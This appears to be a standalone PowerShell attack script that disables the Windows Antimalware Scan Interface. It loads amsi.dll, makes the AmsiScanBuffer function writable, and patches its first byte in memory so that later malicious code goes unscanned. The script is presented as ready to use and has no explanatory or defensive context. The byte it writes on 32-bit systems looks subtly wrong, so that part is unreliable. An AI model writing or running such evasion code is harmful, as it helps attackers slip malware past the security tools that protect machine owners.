# AMSI Bypass
$s = @"
using System;
using System.Runtime.InteropServices;
public class AmsiBypass {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $s

$a = [AmsiBypass]::LoadLibrary("amsi.dll")
$b = [AmsiBypass]::GetProcAddress($a, "AmsiScanBuffer")
$p = [IntPtr]::Size -eq 8 ? 0xC3 : 0x33
[void][AmsiBypass]::VirtualProtect($b, [uint32]1, 0x40, [ref]0)
[System.Runtime.InteropServices.Marshal]::WriteByte($b, $p)

Write-Host "[*] AMSI bypass successfully applied."
